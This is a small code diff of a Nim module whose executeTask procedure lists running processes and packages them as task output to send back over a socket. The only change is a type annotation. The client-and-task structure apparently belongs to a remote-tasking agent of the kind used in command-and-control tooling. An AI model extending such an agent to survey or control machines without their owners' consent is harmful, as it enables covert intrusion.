@@ -1,7 +1,7 @@
 import std/[os, net, json, jsonutils]
 import ../client/[communication, modules]
 
-proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
+proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
   let processes: seq[tuple[name: string, id: int]] = getprocesses()
   let taskOutput = TaskOutput(
     task: "output",
